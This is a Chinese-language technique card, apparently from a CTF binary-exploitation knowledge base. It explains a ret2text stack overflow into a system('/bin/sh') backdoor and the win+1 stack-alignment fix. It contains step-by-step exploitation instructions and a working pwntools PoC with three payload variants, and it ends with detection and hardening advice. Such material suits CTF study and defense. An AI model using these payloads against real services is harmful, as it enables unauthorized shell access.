---
id: binary-pwn-stack-ret2text-win-plus-one-align
title: ret2text：栈溢出跳后门函数及 win+1 栈对齐修正
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2text-backdoor-align
aliases:
- ret2text 后门函数
- win+1 栈对齐
- 后门函数入口偏移
- 栈溢出直接跳 system
- checksec Canary 误判
tags:
- pwn
- stack-overflow
- ret2text
- backdoor
- alignment
- no-pie
- canary
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:57:59+08:00'
  notes: 已对照原文与图04-07核对：checksec(ret2text) 为 Partial RELRO/Canary found/NX/No PIE（图04），sign_in buf[48]、read 0xA0、返回 '[-] signature rejected'（图05），admin_shell 为 system("/bin/sh")（图06），offset=48+8=56；原文先 ret+win 远端失败、改 win+1 后拿 flag（图07）。卡内正确指出 checksec 的 Canary 不代表 sign_in 有栈保护，且 win+1 需按函数序言（push rbp vs endbr64）判断，属未在原文展开的合理推断，confidence=medium 恰当。未验证点：win+1 具体序言未在原文反汇编确认；PoC 未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

当二进制里存在直接调用 `system("/bin/sh")` 的后门函数且未开启 PIE 时，栈溢出覆盖返回地址到该函数即可拿 shell；若直接跳转或“额外 ret + 跳转”在远端因 16 字节栈对齐崩溃，可尝试跳转到 `win+1`（跳过单字节 `push rbp` 序言）来改变 `system` 调用点的 RSP 对齐。

## 原理

- `sign_in()` 把最多 `0xA0` 字节读入 `char buf[48]`，溢出到保存 RBP 的偏移是 48，覆盖返回地址的偏移是 48 + 8 = 56。
- 程序未开 PIE，`admin_shell()`（`return system("/bin/sh");`）的地址固定，直接写入返回地址即可在函数返回时跳转执行；NX 不影响这种复用可执行代码的 ret2text。
- 64 位 System V ABI 要求进入被调函数时 `RSP % 16 == 8`。`system` 内部常使用需要对齐的 SSE 指令，若入口 `RSP % 16 == 0` 可能在 `movaps` 一类指令上崩溃；表现是控制流已成功劫持（函数正常打印返回信息），但在后门函数调用 `system` 时 EOF/崩溃。
- 对齐是否满足由溢出函数的帧布局和跳转方式共同决定。额外插入一个 `ret` gadget 会把 RSP 再抬高 8 字节，可能修正也可能破坏对齐；本例中原作者加 `ret` 后远端失败，改为 `win+1` 后成功。
- `win+1` 的作用取决于后门函数序言：若函数以单字节 `push rbp` 开头，跳过一个字节后从 `mov rbp, rsp` 开始执行，等于省掉一次压栈，后续 `call system` 的 RSP 会相对正常入口偏移 8 字节，从而翻转对齐。若函数以 4 字节 `endbr64` 开头，`+1` 只会落在这 4 字节内部（被当作多字节 NOP），不会跳过 `push rbp`；因此必须先反汇编确认序言，不能机械套用。
- 另一个容易误判的点：`checksec` 显示 `Canary found` 不代表每个函数都插入了栈保护。本例 `sign_in` 的反编译代码没有 `__readfsqword`/`__stack_chk_fail`，偏移 56（48 + 8）也说明 Canary 不在该帧内；应按具体函数确认。

## 触发条件

- 64 位 ELF，存在可覆盖返回地址的栈溢出，且能精确计算到返回地址的偏移。
- 二进制未开启 PIE（或已泄露代码基址），后门函数地址可知。
- 后门函数最终调用 `system("/bin/sh")` 或等价命令执行函数。
- 目标函数所在栈帧没有 Canary，或 Canary 已被泄露并正确回填。

## 利用步骤

1. `checksec` 看整体保护，再用 IDA/反汇编逐个确认目标函数：缓冲区大小、读取上限、是否有 `__stack_chk_fail`。
2. 计算偏移：`buf` 大小 + 保存 RBP；本例 `48 + 8 = 56`。
3. 反汇编后门函数，记录入口与序言；确认第一条指令是 `push rbp` 还是 `endbr64`，判断 `+1` 会落到哪里。
4. 本地先用 `p64(win)` 验证；若在 `system` 处崩溃，依次尝试 `p64(ret) + p64(win)` 与 `p64(win + 1)`，用 gdb 在 `call system` 前查看 `RSP % 16` 选择正确变体。
5. 打远端时，若能看到函数返回后的正常输出（如 “signature rejected”）再 EOF，说明溢出与返回地址劫持已成功，问题只剩入口对齐或后门函数行为。
6. 拿到 shell 后读取 flag。

## PoC

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./ret2text")
win = elf.sym["admin_shell"]          # int admin_shell() { return system("/bin/sh"); }
ret = ROP(elf).find_gadget(["ret"])[0]

p = remote(host, port)
p.recvuntil(b"Submit your signed access token.\n")

offset = 56
# 方案 A：直接跳后门
payload = b"B" * offset + p64(win)
# 方案 B：加 ret 调整对齐
# payload = b"B" * offset + p64(ret) + p64(win)
# 方案 C：跳过单字节 push rbp（仅在序言匹配时使用）
# payload = b"B" * offset + p64(win + 1)

p.sendline(payload)
p.interactive()
```

## 变体与关联

- 变体：后门函数不是 `system("/bin/sh")` 而是 `execve("/bin/sh", 0, 0)`、文件读取函数或 `win()` 启动服务时，链尾替换为对应函数即可，但同样要核算入口对齐与参数寄存器。
- 变体：开启 PIE 时先用格式化字符串/栈泄露拿到代码基址，再计算 `win` 与 gadget 地址。
- 变体：目标函数有 Canary 时先泄露并回填（见格式化字符串关联卡）。
- 关联：[[binary-pwn-rop-static-link-ret2system-sh]]（需要自建 ROP 链的静态链接场景）、[[binary-pwn-stack-ret2libc]]（无后门函数时转入 libc）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（Canary + libc 泄露后 ROP）。
- 边界：`win+1` 是依赖具体序言的技巧，不是通用对齐修正；不同的 GCC 版本、`-fcf-protection`、优化级别都会改变函数开头，必须反汇编确认。若 `+1` 落在指令中间破坏了后门函数逻辑，应改用 `ret` 或调整 gadget 数量。

## 检测与防御

- 检测：崩溃现场 RIP 指向二进制内的非调用点、栈上出现后门函数地址；进程异常执行 `system`/`execve` 并派生 shell；审计包含 `read` 超长写入的登录/输入函数。
- 修复：启用 PIE、Canary、Full RELRO；把 `read` 长度限制为缓冲区大小；移除或限制调试用后门函数；以 `-fstack-protector-strong` 编译。
- 加固：服务进程降权、seccomp 限制 `execve`、控制流完整性（CET/CFI）；不要把“整体 checksec 有 Canary”当成逐函数安全的依据。
